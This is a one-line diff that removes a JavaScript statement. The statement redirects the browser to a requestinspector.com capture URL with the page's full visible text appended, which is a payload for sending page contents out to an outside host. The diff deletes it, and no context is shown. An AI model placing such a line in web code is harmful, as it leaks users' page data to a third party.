@@ -1,1 +1,0 @@
-location=`https://requestinspector.com/inspect/01e81cgcjazn1qa4w9ew82bm08/`+document.body.innerText;
